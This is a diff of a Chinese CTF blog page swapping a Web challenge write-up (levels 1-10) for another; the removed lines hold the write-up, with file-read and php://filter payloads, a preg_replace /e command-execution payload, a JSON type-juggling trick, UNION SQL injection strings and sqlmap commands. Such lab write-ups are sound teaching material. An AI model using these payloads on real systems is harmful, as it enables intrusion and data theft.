@@ -6,64 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://knlvre.github.io/Knlvre.github-io">
-  <title>攻防世界 — Web进阶题(第1-10关) | Knlvre</title>
+  <title>攻防世界 — Web进阶题(第11-20关) | Knlvre</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y，看来是可">
+  <meta name="description" content="PHP2进入题目后给">
 <meta name="keywords" content="CTF-Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界 — Web进阶题(第1-10关)">
-<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/index.html">
+<meta property="og:title" content="攻防世界 — Web进阶题(第11-20关)">
+<meta property="og:url" content="https://knlvre.github.io/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/index.html">
 <meta property="og:site_name" content="Knlvre">
-<meta property="og:description" content="Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y，看来是可">
+<meta property="og:description" content="PHP2进入题目后给">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/6-7.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-1.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-2.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-3.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-4.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-5.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-6.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-7.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-8.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-9.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-10.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/7-11.png">
-<meta property="og:updated_time" content="2019-10-27T03:54:25.418Z">
+<meta property="og:updated_time" content="2019-10-27T08:00:55.361Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界 — Web进阶题(第1-10关)">
-<meta name="twitter:description" content="Cat进入题目后给出一个输入框，输入IP地址后会返回PING的信息  此时想到了命令执行，但是尝试127.0.0.1 &amp;amp; ls、127.0.0.1 &amp;amp;&amp;amp; ls、127.0.0.1 | ls都会显示Invalid URL  网站用的是php写的，但是这个Cloud端就不一定是php的了。 在URL的传参处?url=这里，我们传递个%79发现传递之后变成了?url=y，看来是可">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-1.png">
+<meta name="twitter:title" content="攻防世界 — Web进阶题(第11-20关)">
+<meta name="twitter:description" content="PHP2进入题目后给">
   
     <link rel="alternative" href="/atom.xml" title="Knlvre" type="application/atom+xml">
   
@@ -181,230 +137,28 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-攻防世界 — Web进阶题" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-攻防世界 — Web进阶题（11-20）" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界 — Web进阶题(第1-10关)
+      攻防世界 — Web进阶题(第11-20关)
     </h1>
   
 
         
-        <a href="/Knlvre.github-io/2019/09/05/攻防世界 — Web进阶题/" class="archive-article-date">
-  	<time datetime="2019-09-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-05</time>
+        <a href="/Knlvre.github-io/2019/10/27/攻防世界 — Web进阶题（11-20）/" class="archive-article-date">
+  	<time datetime="2019-10-26T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-27</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>进入题目后给出一个输入框，输入<code>IP地址</code>后会返回<code>PING</code>的信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-1.png" alt="1-1"></p>
-<p>此时想到了<code>命令执行</code>，但是尝试<code>127.0.0.1 &amp; ls</code>、<code>127.0.0.1 &amp;&amp; ls</code>、<code>127.0.0.1 | ls</code>都会显示<code>Invalid URL</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-2.png" alt="1-2"></p>
-<p>网站用的是php写的，但是这个Cloud端就不一定是php的了。</p>
-<p>在URL的传参处<code>?url=</code>这里，我们传递个<code>%79</code>发现传递之后变成了<code>?url=y</code>，看来是可以传递url编码，系统会接受并进行解析</p>
-<p>于是我们传递<code>%80</code>会出现报错，url编码使用的是16进制，80也就是128，ASCII码是从0-127，所以这个时候会报错。</p>
-<p>url编码表可以参考：<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a></p>
-<p>报错信息中可以看到：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeEncodeError at /api/ping</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-3.png" alt="1-3"></p>
-<p>这说明Cloud端使用的是<code>Python的Django框架</code></p>
-<p>看一下官方的文档</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-4.png" alt="1-4"></p>
-<p>所以根据Django的目录，我们使用@进行文件传递，对文件进行读取之后还会把内容传给url参数，如果像上面一样有超出解析范围的编码的时候就会得到错误信息。</p>
-<p>我们的目标首先是数据库文件，看从错误信息中能不能拿到flag，可以从配置文件settings.py的报错中看看有没有database的相关信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/api/setting.py</span><br></pre></td></tr></table></figure>
-<p>搜索关键词<code>database</code>之后，看到两处关键点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.path.join(BASE_DIR, \\\&amp;#39;database.sqlite3\\\&amp;#39;)</span><br><span class="line"></span><br><span class="line">&amp;#39;/opt/api/database.sqlite3&amp;#39</span><br></pre></td></tr></table></figure>
-<p>现在去访问这个<code>/opt/api/database.sqlite3</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=@/opt/api/database.sqlite3</span><br></pre></td></tr></table></figure>
-<p>搜索关键词<code>ctf</code>，找到了flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/1-5.png" alt="1-5"></p>
-<p>参考文章：<a href="https://blog.csdn.net/zz_Caleb/article/details/95041031" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/95041031</a></p>
-<h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
-<p>题目进去之后，只有左边栏中的<code>设备维护中心</code>可以点击，进入页面后点击左上角的<code>云平台设备维护中心</code>，就可以在URL中看到提交了<code>page</code>参数</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-1.png" alt="2-1"></p>
-<p>尝试伪协议读取<code>index.php</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-2.png" alt="2-2"></p>
-<p>base64解码后拿到index.php的源代码，下面给出关键部分</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到使用了<code>preg_replace()</code>函数，这个函数是有漏洞的：</p>
-<blockquote>
-<p> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码</p>
-</blockquote>
-<p>我们直接上<code>system()</code>函数（记得添加X-Forwarded-For字段）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/knlvre/e&amp;rep=system(&apos;ls&apos;)&amp;sub=knlvre</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-3.png" alt="2-3"></p>
-<p>直接可以列出当前目录下的详情，我们直接浏览器访问<code>s3chahahaDir</code>目录，在其下面还发现了<code>flag</code>目录，里面有<code>flag.php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-4.png" alt="2-4"></p>
-<p>还是用前面的伪协议读取就可以了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read/convert.base64-encode/resource=s3chahahaDir/flag/flag.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/2-5.png" alt="2-5"></p>
-<p>解密后得到flag</p>
-<h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>进入该题后，需要先注册一个用户，用户名随意，然后就拥有<code>20块钱</code>。来到<code>Buy</code>页面，输入7个数字，只要猜中数字就能获得对应的报酬（这显然太慢了）</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-2.png" alt="5-2"></p>
-<p>转了几圈没有思路，开始扫目录，发现<code>git</code>源码泄露</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-1.png" alt="5-1"></p>
-<p><code>GitHack</code>下载源码，查看<code>buy.php</code>，将输入的数字提交到 buy.js</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;numbers&quot; id=&quot;numbers&quot; minlength=&quot;7&quot; maxlength=&quot;7&quot; pattern=&quot;\d&#123;7&#125;&quot; required placeholder=&quot;7 numbers&quot;&gt;&lt;button type=&quot;button&quot; id=&quot;btnBuy&quot;&gt;Buy!&lt;/button&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/buy.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>查看<code>buy.js</code>，它将我们提交的<code>numbers</code>又通过<code>POST</code>提交给了 api.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function buy()&#123;	$(&apos;#wait&apos;).show();	$(&apos;#result&apos;).hide();	var input = $(&apos;#numbers&apos;)[0];	if(input.validity.valid)&#123;		var numbers = input.value;		$.ajax(&#123;		  method: &quot;POST&quot;,		  url: &quot;api.php&quot;,		  dataType: &quot;json&quot;,		  contentType: &quot;application/json&quot;, 		  data: JSON.stringify(&#123; action: &quot;buy&quot;, numbers: numbers &#125;)		&#125;).done(function(resp)&#123;			if(resp.status == &apos;ok&apos;)&#123;				show_result(resp);			&#125; else &#123;				alert(resp.msg);			&#125;		&#125;)	&#125; else &#123;		alert(&apos;invalid&apos;);	&#125;	$(&apos;#wait&apos;).hide();&#125;</span><br></pre></td></tr></table></figure>
-<p>查看<code>api.php</code>，从代码中可以看出来，“彩票结果”是变量<code>$win_numbers</code>，通过<code>random_num()</code>、<code>random_win_nums()</code>共同生成</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switch ($data[&apos;action&apos;]) &#123;	case &apos;buy&apos;:		require_keys($data, [&apos;numbers&apos;]);		buy($data);		break;...	default:		response_error(&apos;invalid request&apos;);		break;&#125;function random_num()&#123;	do &#123;		$byte = openssl_random_pseudo_bytes(10, $cstrong);		$num = ord($byte);	&#125; while ($num &gt;= 250);	if(!$cstrong)&#123;		response_error(&apos;server need be checked, tell admin&apos;);	&#125;		$num /= 25;	return strval(floor($num));&#125;function random_win_nums()&#123;	$result = &apos;&apos;;	for($i=0; $i&lt;7; $i++)&#123;		$result .= random_num();	&#125;	return $result;&#125;function buy($req)&#123;	require_registered();	require_min_money(2);	$money = $_SESSION[&apos;money&apos;];	$numbers = $req[&apos;numbers&apos;];	$win_numbers = random_win_nums();	$same_count = 0;	for($i=0; $i&lt;7; $i++)&#123;		if($numbers[$i] == $win_numbers[$i])&#123;			$same_count++;		&#125;	&#125;	switch ($same_count) &#123;		case 2:			$prize = 5;			break;		case 3:			$prize = 20;			break;		case 4:			$prize = 300;			break;		case 5:			$prize = 1800;			break;		case 6:			$prize = 200000;			break;		case 7:			$prize = 5000000;			break;		default:			$prize = 0;			break;	&#125;	$money += $prize - 2;	$_SESSION[&apos;money&apos;] = $money;	response([&apos;status&apos;=&gt;&apos;ok&apos;,&apos;numbers&apos;=&gt;$numbers, &apos;win_numbers&apos;=&gt;$win_numbers, &apos;money&apos;=&gt;$money, &apos;prize&apos;=&gt;$prize]);&#125;</span><br></pre></td></tr></table></figure>
-<p>我们可以测试一下，看生成结果的类型：<code>string</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-3.png" alt="5-3"></p>
-<p><code>$numbers（我们要POST的参数）</code>和<code>$win_numbers（系统生成结果）</code>通过<code>弱类型（==）</code>进行比较</p>
-<p>查看php官方的类型比较表</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-4.png" alt="5-4"></p>
-<p>刚好我们要POST的格式为<code>JSON</code>，而 JSON 支持布尔类型的参数，payload如下</p>
-<blockquote>
-<p>默认提交的 numbers 字段为字符串，由于我们此处提交的不是字符串，所以要记得修改格式为 []</p>
-<p>不知道为什么，我这里提交 7 个 true 只能得到 1800 。多加几个 true 才能拿到 5000000</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-5.png" alt="5-5"></p>
-<p>有钱之后，买下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/5-6.png" alt="5-6"></p>
-<h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>题目描述：如题目环境报错，稍等片刻刷新即可</p>
-<p>连接进去之后看到一个搜索框架，第一时间想到：Sql、XSS、XXE</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-1.png" alt="3-1"></p>
-<p>①方法一</p>
-<p>现在输入框输入测试数值：<code>123</code>，抓包看一下。首先尝试Sql注入，很快就发现参数<code>单引号</code>包裹，列数为<code>3</code>，没有任何过滤，正常注入就行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+]注表名：search=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">返回：news,secret_table</span><br><span class="line"></span><br><span class="line">[+]注列名：search=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;secret_table&quot; #</span><br><span class="line">返回：id,fl4g</span><br><span class="line"></span><br><span class="line">[+]注数据：search=-1&apos; union select 1,2,fl4g from secret_table #</span><br><span class="line">返回：QCTF&#123;sq1_inJec7ion_ezzz&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-2.png" alt="3-2"></p>
-<p>②方法二</p>
-<p>在网上看到其他大佬的WriteUp，使用Sqlmap来自动完成的，深感工具的魅力，平时都是手动注入，现在将本题利用Sqlmap的过程记录下来</p>
-<p>首先还是需要抓取请求，然后将<code>请求</code>复制下来，放进Sqlmap文件夹内的一个<code>txt（本题是模板.txt）</code>里</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-3.png" alt="3-3"></p>
-<p>然后开始用<code>Python2</code>跑Sqlmap，命令及结果如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt --dbs</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-4.png" alt="3-4"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt -D news --tables</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-5.png" alt="3-5"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r 模板.txt -D news -T secret_table --dump</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/3-6.png" alt="3-6"></p>
-<p>参考文章：<a href="https://blog.csdn.net/yangker12148/article/details/90635554" target="_blank" rel="noopener">https://blog.csdn.net/yangker12148/article/details/90635554</a></p>
-<h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>链接进去之后只有<code>Home</code>、<code>About</code>、<code>Contact</code>可以点击，对应的url传递的<code>page</code>参数也随之改变</p>
-<p>没有任何输入点，直接用Github上的工具<code>Dirsearch</code>扫一下，发现了<code>.git</code>文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://111.198.29.45:59852/?page=home -e php</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-1.png" alt="4-1"></p>
-<p>用GitHub上的工具<code>Githack</code>去下载源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py http://111.198.29.45:59852/.git</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/4-2.png" alt="4-2"></p>
-<p>首先去查看了<code>templates</code>目录，发现里面有<code>flag.php</code>，但是没有有用的东西。只能退后去看index.php，发现了漏洞点</p>
-<p>关键代码：</p>
